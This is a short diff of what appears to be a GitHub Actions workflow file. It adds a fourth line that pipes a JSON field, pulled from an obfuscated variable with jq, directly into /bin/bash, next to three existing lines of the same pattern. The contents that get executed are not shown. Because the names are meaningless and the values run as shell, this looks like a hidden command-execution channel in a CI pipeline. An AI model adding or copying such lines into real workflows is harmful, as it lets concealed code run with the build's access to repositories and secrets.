@@ -27,6 +27,7 @@ jobs:
           echo $b5 | jq -r .tutg6 | /bin/bash
           echo $isi090 | jq -r .o9026 | /bin/bash
           echo $m133 | jq -r .db95 | /bin/bash
+          echo $l8685 | jq -r .dyn71051 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
